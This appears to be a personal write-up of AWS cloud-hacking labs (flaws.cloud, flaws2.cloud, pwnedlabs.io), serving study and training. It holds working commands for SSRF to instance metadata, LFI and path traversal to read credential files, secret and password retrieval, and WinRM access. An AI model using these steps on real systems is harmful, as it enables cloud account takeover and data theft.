  <img src="https://github.com/user-attachments/assets/63c9c9ba-cba0-4710-89c9-988b9d2e3f82" />
</p>

<br>

### Level 5
```
This EC2 has a simple HTTP only proxy on it. Here are some examples of it's usage:
http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/flaws.cloud/
http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/summitroute.com/blog/feed.xml
http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/neverssl.com/
See if you can use this proxy to figure out how to list the contents of the level6 bucket at level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud that has a hidden directory in it.
```
This is basically a free SSRF, so let's try going for EC2 metadata 
```
┌──(kali㉿kali)-[~]
└─$ curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/
flaws
┌──(kali㉿kali)-[~]
└─$ curl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws
{
  "Code" : "Success",
  "LastUpdated" : "2025-10-10T20:15:29Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA6GG7PSQGRWLZRMOX",
  "SecretAccessKey" : "fxPUS3him5NGOskB7dvv8QfeKQGIAarcG6+k2MER",
  "Token" : "IQoJb3JpZ2luX2VjEFwaCXVzLXdlc3QtMiJGMEQCICBnNMSti0......
  "Expiration" : "2025-10-11T02:23:14Z"
}   
```
Add these credentials to `~/.aws/credentials` and confirm they work
```
┌──(kali㉿kali)-[~/Desktop]
└─$ aws --profile flaws sts get-caller-identity
{
    "UserId": "AROAI3DXO3QJ4JAWIIQ5S:i-05bef8a081f307783",
    "Account": "975426262029",
    "Arn": "arn:aws:sts::975426262029:assumed-role/flaws/i-05bef8a081f307783"
}
```
And this must be the hidden directory we have to browse to
```
┌──(kali㉿kali)-[~/Desktop]
└─$ aws --profile flaws s3 ls s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ 
                           PRE ddcc78ff/
2017-02-26 21:11:07        871 index.html
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop]
└─$ aws --profile flaws s3 ls s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/
2017-03-02 23:36:23       2463 hint1.html
2017-03-02 23:36:23       2080 hint2.html
2020-05-22 14:42:20       2924 index.html
```

<br>

### Level 6
```
For this final challenge, you're getting a user access key that has the SecurityAudit policy attached to it. See what else it can do and what else you might find in this AWS account.
Access key ID: AKIAJFQ6E7BY57Q3OBGA
Secret: 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
```

Starting with basic enumeration, we check our identity and our permissions
```
┌──(kali㉿kali)-[~]
└─$ aws --profile SecurityAudit sts get-caller-identity                                         
{
    "UserId": "AIDAIRMDOSCWGLCDWOG6A",
    "Account": "975426262029",
    "Arn": "arn:aws:iam::975426262029:user/Level6"
}
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ aws --profile SecurityAudit iam list-attached-user-policies --user-name Level6
{
    "AttachedPolicies": [
        {
            "PolicyName": "MySecurityAudit",
            "PolicyArn": "arn:aws:iam::975426262029:policy/MySecurityAudit"
        },
        {
            "PolicyName": "list_apigateways",
            "PolicyArn": "arn:aws:iam::975426262029:policy/list_apigateways"
        }
    ]
}
```
To enumerate the policies, use the combination of these two commands. For each of them, list their policy versions and then go deeper with `get-policy-version` for each version. Obviously replace the policy-arn, version-id and profile as desired
```
aws --profile SecurityAudit iam list-policy-versions --policy-arn arn:aws:iam::975426262029:policy/list_apigateways
aws --profile SecurityAudit iam get-policy-version --policy-arn arn:aws:iam::975426262029:policy/list_apigateways --version-id v4
```

The most relevant things I found were:
* MySecurityAudit role is extremely permissive, including with Lambda functions
* There are references to an API gateway resource called `puspzvwgb6/*` and `/restapis/puspzvwgb6/stages` 

Enumerating lambda...
```
──(kali㉿kali)-[~]
└─$ aws --profile SecurityAudit lambda list-functions --region us-west-2
{
    "Functions": [
        {
            "FunctionName": "Level6",
            "FunctionArn": "arn:aws:lambda:us-west-2:975426262029:function:Level6",
            "Runtime": "python2.7",
<snip>
```
In the policy associated with it, note how the REST API ID was leaked in the `SourceArn` field
```
┌──(kali㉿kali)-[~]
└─$ aws --profile SecurityAudit lambda get-policy --function-name Level6 --region us-west-2     
{
    "Policy": "{\"Version\":\"2012-10-17\",\"Id\":\"default\",\"Statement\":[{\"Sid\":\"904610a93f593b76ad66ed6ed82c0a8b\",\"Effect\":\"Allow\",\"Principal\":{\"Service\":\"apigateway.amazonaws.com\"},\"Action\":\"lambda:InvokeFunction\",\"Resource\":\"arn:aws:lambda:us-west-2:975426262029:function:Level6\",\"Condition\":{\"ArnLike\":{\"AWS:SourceArn\":\"arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6\"}}}]}",
    "RevisionId": "edaca849-06fb-4495-a09c-3bc6115d3b87"
}
```
The API URL format should look something like this `https://<REST_api_id>.execute-api.<region>.amazonaws.com/<API_stage_name>/<function>`. We have the ID, the region and the function. The stage name can be fetched with
```
┌──(kali㉿kali)-[~]
└─$ aws --profile SecurityAudit apigateway get-stages --rest-api-id s33ppypa75 --region us-west-2
{
    "item": [
        {
            "deploymentId": "8gppiv",
            "stageName": "Prod",
            "cacheClusterEnabled": false,
<snip>
```

So the full URL is going to be `https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/Level6`. Lesson learned: use lower case :)
```
┌──(kali㉿kali)-[~]
└─$ curl https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/Level6
{"message": "Internal server error"}                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ curl https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6
"Go to http://theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud/d730aa2b/"
```

<p align="center">
  <img width="50%" src="https://github.com/user-attachments/assets/5114b201-b2d8-46b7-a90c-380cc9508e90" >
</p>


<br>

## flaws2.cloud (attacker path)

Same as the first flaws, definitely worth your time. Unfortunately there are less levels, but on the other hand it looks a bit more realistic with the combination of web and cloud hacking

### Level 1

Seems to start off as a web challenge, cool! Let's fire up burp

<p align="center">
  <img width="50%" src="https://github.com/user-attachments/assets/073f62a0-524b-4d7e-95e5-f2bea499b691" >
</p>

Simply intercept the request and send a string as the code in the GET parameter. The application will break and will leak AWS credentials


<p align="center">
  <img width="50%" src="https://github.com/user-attachments/assets/bd80a0aa-0036-4944-9cc5-5b20424be41a" >
</p>

We add them to `~/.aws/credentials` check if they're valid...
```
┌──(kali㉿kali)-[~/Desktop]
└─$ nano ~/.aws/credentials
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop]
└─$ aws sts get-caller-identity                                            
{
    "UserId": "AROAIBATWWYQXZTTALNCE:level1",
    "Account": "653711331788",
    "Arn": "arn:aws:sts::653711331788:assumed-role/level1/level1"
}
```

They are! So let's try to list what's inside the bucket
```
┌──(kali㉿kali)-[~/Desktop]
└─$ aws s3 ls s3://level1.flaws2.cloud                                                
                           PRE img/
2018-11-20 15:55:05      17102 favicon.ico
2018-11-20 21:00:22       1905 hint1.htm
2018-11-20 21:00:22       2226 hint2.htm
2018-11-20 21:00:22       2536 hint3.htm
2018-11-20 21:00:23       2460 hint4.htm
2018-11-20 21:00:17       3000 index.htm
2018-11-20 21:00:17       1899 secret-ppxVFdwV4DDtZm8vbQRvhxL8mE6wxNco.html
```

Curling or using a browser to fetch the secret HTML reveals Level 2 at http://level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud.

### Level 2
```
This next level is running as a container at http://container.target.flaws2.cloud/. Just like S3 buckets, other resources on AWS can have open permissions. I'll give you a hint that the ECR (Elastic Container Registry) is named "level2".
```

If an ECR is public, we can list its images. For that we need the repository name and the registry ID
```
┌──(kali㉿kali)-[~]
└─$ aws sts get-caller-identity
{
    "UserId": "AROAIBATWWYQXZTTALNCE:level1",
    "Account": "653711331788",
    "Arn": "arn:aws:sts::653711331788:assumed-role/level1/level1"
}
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ aws ecr list-images --repository-name level2 --registry-id 653711331788
{
    "imageIds": [
        {
            "imageDigest": "sha256:513e7d8a5fb9135a61159fbfbc385a4beb5ccbd84e5755d76ce923e040f9607e",
            "imageTag": "latest"
        }
    ]
}
```
We can enumerate further by fetching the manifest of this container with

```
┌──(kali㉿kali)-[~]
└─$ aws ecr batch-get-image --repository-name level2 --registry-id 653711331788 --image-ids imageTag=latest | jq '.images[].imageManifest | fromjson'

{
  "schemaVersion": 2,
  "mediaType": "application/vnd.docker.distribution.manifest.v2+json",
  "config": {
    "mediaType": "application/vnd.docker.container.image.v1+json",
    "size": 5359,
    "digest": "sha256:2d73de35b78103fa305bd941424443d520524a050b1e0c78c488646c0f0a0621"
  },
  "layers": [
    {
      "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
      "size": 43412182,
      "digest": "sha256:7b8b6451c85f072fd0d7961c97be3fe6e2f772657d471254f6d52ad9f158a580"
    },
    {
      "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
      "size": 848,
      "digest": "sha256:ab4d1096d9ba178819a3f71f17add95285b393e96d08c8a6bfc3446355bcdc49"
    },
<snip>
```

We  can request a download URL for each layer with the following command. This required some trial and error until I found something useful
```
┌──(kali㉿kali)-[~]
└─$ aws ecr get-download-url-for-layer --repository-name level2 --registry-id 653711331788 --layer-digest "sha256:2d73de35b78103fa305bd941424443d520524a050b1e0c78c488646c0f0a0621"

{
    "downloadUrl": "https://prod-us-east-1-starport-layer-bucket.s3.us-east-1.amazonaws.com/c814-653711331788-58b3a0a8-1806-5777-1.....
}
```

Browsing to the URL will download the file which contains credentials

<p align="center">
  <img width="50%" src="https://github.com/user-attachments/assets/ef3ee4e6-8694-4ed0-8cac-ad2066161878" >
</p>

These creds work in the initial login form, and we find Level 3 at http://level3-oc6ou6dnkw8sszwvdrraxc5t5udrsw3s.flaws2.cloud/


### Level 3

```
The container's webserver you got access to includes a simple proxy that can be access with: http://container.target.flaws2.cloud/proxy/http://flaws.cloud or http://container.target.flaws2.cloud/proxy/http://neverssl.com
```

Once again this screams SSRF! AWS containers running on ECS usually have their credentials at `169.254.170.2/v2/credentials/GUID`, where GUID is a value disclosed in the environment variables. Using the proxy, we can exploit an LFI vulnerability
```
┌──(kali㉿kali)-[~]
└─$ curl http://container.target.flaws2.cloud/proxy/file:///proc/self/environ --output out.txt
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   574    0   574    0     0   1649      0 --:--:-- --:--:-- --:--:--  1654
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ cat out.txt                                                                               
HOSTNAME=ip-172-31-47-179.ec2.internalHOME=/rootAWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/7e4ba77c-58ec-4523-bb72-1f719c03a12c....
```

The important part is `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/7e4ba77c-58ec-4523-bb72-1f719c03a12c`, we can curl that with the proxy...
```
┌──(kali㉿kali)-[~]
└─$ curl http://container.target.flaws2.cloud/proxy/http://169.254.170.2/v2/credentials/7e4ba77c-58ec-4523-bb72-1f719c03a12c
{"RoleArn":"arn:aws:iam::653711331788:role/level3","AccessKeyId":"ASIAZQNB3KHGPGUE3GXV","SecretAccessKey":"6LcdopLQNXKE2gLAXt......
```

Add them to the credentials file and test them
```
┌──(kali㉿kali)-[~]
└─$ nano ~/.aws/credentials
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ aws sts get-caller-identity --profile flaws2l3
{
    "UserId": "AROAJQMBDNUMIKLZKMF64:cb2fb3252d31461abd9fcd33b7980cc5",
    "Account": "653711331788",
    "Arn": "arn:aws:sts::653711331788:assumed-role/level3/cb2fb3252d31461abd9fcd33b7980cc5"
}
```

Enumerate S3 buckets
```
┌──(kali㉿kali)-[~]
└─$ aws s3 ls --profile flaws2l3
2018-11-20 14:50:08 flaws2.cloud
2018-11-20 13:45:26 level1.flaws2.cloud
2018-11-20 20:41:16 level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud
2018-11-26 14:47:22 level3-oc6ou6dnkw8sszwvdrraxc5t5udrsw3s.flaws2.cloud
2018-11-27 15:37:27 the-end-962b72bjahfm5b4wcktm8t9z4sapemjb.flaws2.cloud
```

And we get the final flag/URL at http://the-end-962b72bjahfm5b4wcktm8t9z4sapemjb.flaws2.cloud/


<br>

## pwnedlabs.io

Most stuff here is paid, but the free labs are pretty good, I'd definitely recommend them. I filtered by Red Team, AWS and Free and completed them all. It goes a bit more in depth than both flaws.cloud and covers some other service-specific vulnerabilities, so go ahead and try them out! Sometimes you even get to combine cloud with web or infrastructure pentesting. They claim to be "Beginner" and "Foundational" level, but some of them aren't super obvious if you're just starting your journey. Each lab has a thorough walkthrough so I won't bother with that, but I'll still leave some scattered notes in this section whenever I come across something new 

<br>

With the ARN of the role under our control and the S3 bucket name, the account ID of the S3 bucket owner can be bruted forced. This can be useful to later enumerate IAM roles and users tied to that account, as well as any public EBS and RDS snapshots
```
┌──(kali㉿kali)-[~/Desktop]
└─$ s3-account-search arn:aws:iam::427648302155:role/LeakyBucket mega-big-tech
Starting search (this can take a while)
<snip>
found: 1075135037
found: 10751350379
found: 107513503799
```

Easily find bucket regions with a curl
```
┌──(kali㉿kali)-[~/Desktop]
└─$ curl -I https://mega-big-tech.s3.amazonaws.com
HTTP/1.1 200 OK
x-amz-id-2: tOkh24CvBcIKGT0P03mYWpctfXunTsg61GKNph3w3/9np4XdE3CvAKJ+dwpg8iZVY8hmUWNA53cb1fqahOqOdHU312cGPAVfRQKzZfYyoYY=
x-amz-request-id: EBR4D7N9PWV6XVK7
Date: Wed, 15 Oct 2025 21:11:39 GMT
x-amz-bucket-region: us-east-1
x-amz-access-point-alias: false
Content-Type: application/xml
Transfer-Encoding: chunked
Server: AmazonS3
```

--- 

You can copy S3 files to the local system without using a browser
```
┌──(kali㉿kali)-[~/Desktop]
└─$ aws s3 cp s3://dev.huge-logistics.com/shared/hl_migration_project.zip . --no-sign-request
download: s3://dev.huge-logistics.com/shared/hl_migration_project.zip to ./hl_migration_project.zip
```

Run <a href="https://github.com/shabarkin/aws-enumerator">aws-enumerator</a> to enumerate permissions against services
```
┌──(kali㉿kali)-[~/Desktop]
└─$ aws-enumerator enum -services all                                                                                                                
Message:  Successful APPMESH: 0 / 1
Message:  Successful APPSYNC: 0 / 1
<snip>
Message:  Successful SECRETSMANAGER: 1 / 2
```

This tool also allows dumping permissions for a specific service
```
┌──(kali㉿kali)-[~/Desktop]
└─$ aws-enumerator dump -services secretsmanager
-------------------------------------------------- SECRETSMANAGER --------------------------------------------------
ListSecrets
```

To call secretsmanager to list secrets
```
┌──(kali㉿kali)-[~/Desktop]
└─$ aws secretsmanager list-secrets
{
    "SecretList": [
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:427648302155:secret:employee-database-admin-Bs8G8Z",
            "Name": "employee-database-admin",
            "Description": "Admin access to MySQL employee database",
            "LastChangedDate": "2023-07-12T14:15:38.909000-04:00",
<snip>
```

And to get a specific secret
```
┌──(kali㉿kali)-[~/Desktop]
└─$ aws secretsmanager get-secret-value --secret-id ext/cost-optimization
{
    "ARN": "arn:aws:secretsmanager:us-east-1:427648302155:secret:ext/cost-optimization-p6WMM4",
    "Name": "ext/cost-optimization",
    "VersionId": "f7d6ae91-5afd-4a53-93b9-92ee74d8469c",
    "SecretString": "{\"Username\":\"ext-cost-user\",\"Password\":\"K33pOurCostsOptimized!!!!\"}",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": "2023-08-04T17:19:28.512000-04:00"
}
```

Cloudshell doesn't expose the real EC2 metadata IP, instead we can contact it via a local proxy. To get credentials from metadata, including the session token
```
[cloudshell-user@ip-10-132-50-112 ~]$ curl -X PUT localhost:1338/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 60"
or9vBtyYCFsO2IMHgKffq0Kdzwk/syyNOA5iJCx5BNM=

[cloudshell-user@ip-10-132-50-112 ~]$ curl localhost:1338/latest/meta-data/container/security-credentials -H "X-aws-ec2-metadata-token: or9vBtyYCFsO2IMHgKffq0Kdzwk/syyNOA5iJCx5BNM="
{
        "Type": "",
        "AccessKeyId": "ASIAWHEOTHRF6G2LNQPT",
        "SecretAccessKey": "o9oJoJOFNqeyErKno4A0TmfKVYfdjokyOSZ8Ff+e",
        "Token": "IQoJb3JpZ2luX2VjEAQaCXVzLWVhc3QtMSJHMEUCIQDbrI7eb+9M3.....
        "Expiration": "2025-10-17T19:35:10Z",
        "Code": "Success"
}
```

To list policies attached to a user
```
┌──(kali㉿kali)-[~/Desktop]
└─$ aws iam list-attached-user-policies --user-name ext-cost-user
{
    "AttachedPolicies": [
        {
            "PolicyName": "ExtCloudShell",
            "PolicyArn": "arn:aws:iam::427648302155:policy/ExtCloudShell"
        },
        {
            "PolicyName": "ExtPolicyTest",
            "PolicyArn": "arn:aws:iam::427648302155:policy/ExtPolicyTest"
        }
    ]
}
```

To get more info about it, this is useful to find the version
```
┌──(kali㉿kali)-[~/Desktop]
└─$ aws iam get-policy --policy-arn arn:aws:iam::427648302155:policy/ExtPolicyTest
{
    "Policy": {
        "PolicyName": "ExtPolicyTest",
        "PolicyId": "ANPAWHEOTHRF7772VGA5J",
        "Arn": "arn:aws:iam::427648302155:policy/ExtPolicyTest",
        "Path": "/",
        "DefaultVersionId": "v4",
        "AttachmentCount": 1,
        "PermissionsBoundaryUsageCount": 0,
        "IsAttachable": true,
        "CreateDate": "2023-08-04T21:47:26+00:00",
        "UpdateDate": "2023-08-06T20:23:42+00:00",
        "Tags": []
    }
}
```

And finally, to read the policy document, which requires its version
```
┌──(kali㉿kali)-[~/Desktop]
└─$ aws iam get-policy-version --policy-arn arn:aws:iam::427648302155:policy/ExtPolicyTest --version-id v4
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Sid": "VisualEditor0",
                    "Effect": "Allow",
                    "Action": [
                        "iam:GetRole",
                        "iam:GetPolicyVersion",
                        "iam:GetPolicy",
                        "iam:GetUserPolicy",
                        "iam:ListAttachedRolePolicies",
                        "iam:ListAttachedUserPolicies",
                        "iam:GetRolePolicy"
                    ],
                    "Resource": [
                        "arn:aws:iam::427648302155:policy/ExtPolicyTest",
                        "arn:aws:iam::427648302155:role/ExternalCostOpimizeAccess",
                        "arn:aws:iam::427648302155:policy/Payment",
                        "arn:aws:iam::427648302155:user/ext-cost-user"
                    ]
                }
            ]
        },
        "VersionId": "v4",
        "IsDefaultVersion": true,
        "CreateDate": "2023-08-06T20:23:42+00:00"
    }
}
```

Examining a role, note how it requires passing an External ID if the action sts:AssumeRole is called
```
┌──(kali㉿kali)-[~/Desktop]
└─$ aws iam get-role --role-name ExternalCostOpimizeAccess
{
    "Role": {
        "Path": "/",
        "RoleName": "ExternalCostOpimizeAccess",
        "RoleId": "AROAWHEOTHRFZP3NQR7WN",
        "Arn": "arn:aws:iam::427648302155:role/ExternalCostOpimizeAccess",
        "CreateDate": "2023-08-04T21:09:30+00:00",
        "AssumeRolePolicyDocument": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Principal": {
                        "AWS": "arn:aws:iam::427648302155:user/ext-cost-user"
                    },
                    "Action": "sts:AssumeRole",
                    "Condition": {
                        "StringEquals": {
                            "sts:ExternalId": "37911"
                        }
                    }
                }
            ]
<snip>
```

And to call that action
```
┌──(kali㉿kali)-[~/Desktop]
└─$ aws sts assume-role --role-arn arn:aws:iam::427648302155:role/ExternalCostOpimizeAccess --role-session-name ExternalCostOpimizeAccess --external-id 37911
{
    "Credentials": {
        "AccessKeyId": "ASIAWHEOTHRF4T5VZBVZ",
        "SecretAccessKey": "RvbakyfLNHKGnAl+18Gb6XGY8JiTMkNlTHzzFLQt",
<snip>
```

--- 

The syntax is very similar from service to service, so it's fairly easy to invoke an action after finding we have permission for it. Another example...
```
┌──(kali㉿kali)-[~/Desktop]
└─$ aws iam get-policy-version --policy-arn arn:aws:iam::427648302155:policy/Policy --version-id v4
{
    "PolicyVersion": {
        "Document": {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Sid": "VisualEditor0",
                    "Effect": "Allow",
                    "Action": "ec2:DescribeInstances",
                    "Resource": "*"
                },
                {
                    "Sid": "VisualEditor1",
                    "Effect": "Allow",
                    "Action": "ec2:GetPasswordData",
                    "Resource": "arn:aws:ec2:us-east-1:427648302155:instance/i-04cc1c2c7ec1af1b5"
                },
                {
                    "Sid": "VisualEditor2",
                    "Effect": "Allow",
                    "Action": [
                        "iam:GetPolicyVersion",
                        "iam:GetPolicy",
                        "iam:GetUserPolicy",
                        "iam:ListAttachedUserPolicies",
                        "s3:GetBucketPolicy"
                    ],
                    "Resource": [
                        "arn:aws:iam::427648302155:user/contractor",
                        "arn:aws:iam::427648302155:policy/Policy",
                        "arn:aws:s3:::hl-it-admin"
                    ]
                }
            ]
        },
        "VersionId": "v4",
        "IsDefaultVersion": true,
        "CreateDate": "2023-07-28T14:24:22+00:00"
    }
}

┌──(kali㉿kali)-[~/Desktop]
└─$ aws ec2 get-password-data --instance-id i-04cc1c2c7ec1af1b5
{
    "InstanceId": "i-04cc1c2c7ec1af1b5",
    "Timestamp": "2024-12-01T07:51:43+00:00",
    "PasswordData": "s2QgAyMRT/OAjxv2F5FK.......
}

┌──(kali㉿kali)-[~/Desktop]
└─$ aws s3api get-bucket-policy --bucket hl-it-admin
{
    "Policy": "{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Principal\":{\"AWS\":\"arn:aws:iam::427648302155:user/contractor\"},\"Action\":\"s3:GetObject\",\"Resource\":\"arn:aws:s3:::hl-it-admin/ssh_keys/ssh_keys_backup.zip\"}]}"
}
                                                                                                                    
┌──(kali㉿kali)-[~/Desktop]
└─$ aws s3 cp s3://hl-it-admin/ssh_keys/ssh_keys_backup.zip . 
download: s3://hl-it-admin/ssh_keys/ssh_keys_backup.zip to ./ssh_keys_backup.zip
```

With access to SSH keys, EC2's describe instances can give a hint to where they can be used. Let's use Pacu's ec2__enum
```
Pacu (contractor:contractor) > run ec2__enum
  Running module ec2__enum...
Automatically targeting regions:
  ap-northeast-1
  eu-central-1
  eu-north-1
<snip>
[ec2__enum] Starting region us-east-1...
[ec2__enum]   3 instance(s) found.
[ec2__enum] FAILURE: 
[ec2__enum]   Access denied to DescribeSecurityGroups.
[ec2__enum]     Skipping security group enumeration...
[ec2__enum]   0 security groups(s) found.
[ec2__enum] FAILURE: 
[ec2__enum]   Access denied to DescribeAddresses.
[ec2__enum]     Skipping elastic IP enumeration...
[ec2__enum]   0 elastic IP address(es) found.
[ec2__enum]   2 public IP address(es) found and added to text file located at: ~/.local/share/pacu/contractor/downloads/ec2_public_ips_contractor_us-east-1.txt
<snip>

┌──(kali㉿kali)-[~/Desktop]
└─$ cat ~/.local/share/pacu/contractor/downloads/ec2_public_ips_contractor_us-east-1.txt
54.226.75.125
52.0.51.234
```

After an nmap scan, 54.226.75.125 has port 5985 open (WinRM). With it-admin's launch key, request its password with
```
┌──(kali㉿kali)-[~/Desktop]
└─$ aws ec2 get-password-data --instance-id i-04cc1c2c7ec1af1b5 --priv-launch-key it-admin.pem
{
    "InstanceId": "i-04cc1c2c7ec1af1b5",
    "Timestamp": "2024-12-01T07:51:43.000Z",
    "PasswordData": "UZ$abRnO!bPj@KQk%BSEaB*IO%reJIX!"
}

┌──(kali㉿kali)-[~/Desktop]
└─$ evil-winrm -i 54.226.75.125 -u administrator
Enter Password:
<snip>

*Evil-WinRM* PS The term 'Invoke-Expression' is not recognized as the name of a cmdlet, function, script file, or operable program......
```

After lots of troubleshooting and attempting to escape a restricted shell, I just decided to use crackmapexec. Combine Windows post-exploitation skills to loot for credentials and exploit the local machine further

--- 

Example of fuzzing S3 buckets
```
┌──(kali㉿kali)-[~/Desktop]
└─$ ffuf -u "https://hlogistics-ENVIRONMENT.s3.REGION.amazonaws.com" -w "regions.txt:REGION" -w "/usr/share/wordlists/seclists/s3-bucket-name-list.txt:ENVIRONMENT" --mc=200,403
<snip>
[Status: 200, Size: 8959, Words: 4, Lines: 2, Duration: 80ms]
    * ENVIRONMENT: images
    * REGION: eu-west-2

[Status: 200, Size: 535, Words: 4, Lines: 2, Duration: 70ms]
    * ENVIRONMENT: web
    * REGION: eu-west-2

```

---

Another way of enumerating IAM permissions
```
┌──(kali㉿kali)-[/usr/share/wordlists/seclists]
└─$ aws iam list-user-policies --user-name ecollins
{
    "PolicyNames": [
        "SSM_Parameter"
    ]
}
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[/usr/share/wordlists/seclists]
└─$ aws iam get-user-policy --user-name ecollins --policy-name SSM_Parameter
{
    "UserName": "ecollins",
    "PolicyName": "SSM_Parameter",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Effect": "Allow",
                "Action": [
                    "ssm:GetParameter",
                    "ssm:DescribeParameters"
                ],
                "Resource": "arn:aws:ssm:eu-west-2:243687662613:parameter/lharris"
            }
        ]
    }
}
```

---

Enumerating EC2 launch templates. One interesting parameter is the user data script in base64
```
┌──(kali㉿kali)-[~/Desktop]
└─$ aws ec2 describe-launch-templates                                                     
{
    "LaunchTemplates": [
        {
            "LaunchTemplateId": "lt-05c3bbb6108e76f9b",
            "LaunchTemplateName": "SCHEDULER",
            "CreateTime": "2025-03-04T20:35:50.000Z",
            "CreatedBy": "arn:aws:iam::243687662613:root",
            "DefaultVersionNumber": 1,
            "LatestVersionNumber": 1,
            "Operator": {
                "Managed": false
            }
        }
    ]
}
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop]
└─$ aws ec2 describe-launch-template-versions --launch-template-name SCHEDULER
{
    "LaunchTemplateVersions": [
        {
            "LaunchTemplateId": "lt-05c3bbb6108e76f9b",
            "LaunchTemplateName": "SCHEDULER",
            "VersionNumber": 1,
            "VersionDescription": "Production logistics scheduling application",
            "CreateTime": "2025-03-04T20:35:50.000Z",
            "CreatedBy": "arn:aws:iam::243687662613:root",
            "DefaultVersion": true,
            "LaunchTemplateData": {
                "ImageId": "ami-091f18e98bc129c4e",
                "InstanceType": "t2.medium",
                "UserData": "IyEvYmluL2Jhc2gKCmFwdCBpbnN0YWxsIC1.....
                "MetadataOptions": {
                    "HttpTokens": "optional",
                    "HttpPutResponseHopLimit": 2,
                    "HttpEndpoint": "enabled"
                }
            },
            "Operator": {
                "Managed": false
            }
        }
    ]
}
```

---

Use LFIs to steal AWS credentials from home folders. Check /etc/passwd for user enumeration first
```
┌──(kali㉿kali)-[~/Desktop]
└─$ curl --path-as-is -i -s -k -X $'GET' \
    -H $'Host: 13.50.73.5' -H $'Upgrade-Insecure-Requests: 1' -H $'Priority: u=0, i' \
    -b $'session=eyJpc0xvZ2dlZEluIjp0cnVlLCJuYW1lIjoidGVzdCJ9.aPPVxA.FEsyAfaxqimNvtJuHoJIXFSoNaQ' \
    $'http://13.50.73.5/download?file=../../../../../home/nedf/.aws/credentials'       
HTTP/1.1 200 OK
Content-Disposition: inline; filename=credentials
Content-Type: application/octet-stream
Content-Length: 116
Last-Modified: Wed, 14 Jun 2023 18:13:45 GMT
Cache-Control: no-cache
ETag: "1686766425.6516593-116-403247842"
Date: Sat, 18 Oct 2025 18:07:31 GMT
Vary: Cookie

[default]
aws_access_key_id = AKIATWVWNKAVEUUNAYO6
aws_secret_access_key = EuEQvgS68SmMX3ldbBPHNjIjFg1L1MRJ7RDR2YJ+
```

---

Example of listing files inside an S3 bucket recursively
```
┌──(kali㉿kali)-[~/Desktop]
└─$ aws s3 ls s3://huge-logistics-dashboard --no-sign-request --recursive    
2023-08-16 14:25:59          0 private/
2023-08-12 15:09:01     833071 static/css/dashboard-free.css.map
2023-08-12 15:09:14     402732 static/css/dashboard.css
2023-08-12 15:09:17        904 static/css/demo.css
2023-08-12 15:09:19       7743 static/css/icons.css
2023-08-12 15:09:19        495 static/css/main.css
2023-08-12 15:08:05      15996 static/images/favicon.ico
2023-08-12 15:08:17     251708 static/images/hero.jpg
2023-08-12 15:08:20      15996 static/images/logo.png
2023-08-12 15:08:24      37930 static/images/profile.png
2023-08-12 15:09:21        590 static/js/api.js
2023-08-12 16:43:43        244 static/js/auth.js
2023-08-12 15:09:22       7297 static/js/dash.js
2023-08-12 15:09:24      19027 static/js/demo.js
2023-08-12 15:09:28      84355 static/js/jquery.min.js
2023-08-12 15:09:32     127542 static/js/jquery.min.map
2023-08-12 15:09:36      15612 static/js/plugins/bootstrap-notify.js
2023-08-12 15:09:42     157844 static/js/plugins/chartjs.min.js
2023-08-12 15:09:44      18292 static/js/plugins/perfect-scrollbar.jquery.min.js
2023-08-12 15:09:34      18994 static/js/popper.min.js
```

If you find an interesting file, check if version is enabled with curl by looking for the header x-amz-version-id
```
┌──(kali㉿kali)-[~/Desktop]
└─$ curl -I https://huge-logistics-dashboard.s3.eu-north-1.amazonaws.com/static/js/auth.js
HTTP/1.1 200 OK
x-amz-id-2: TYkABAp3nTJbpE2wuoaz3BDRvjj5S0jofaLo5AzBfHWLqDvmcLhJorfr4U19FinE7oveTylWMvU=
x-amz-request-id: VG77YA8PDZJVDGGM
Date: Sun, 19 Oct 2025 15:55:50 GMT
Last-Modified: Sat, 12 Aug 2023 20:43:43 GMT
ETag: "c3d04472943ae3d20730c1b81a3194d2"
x-amz-server-side-encryption: AES256
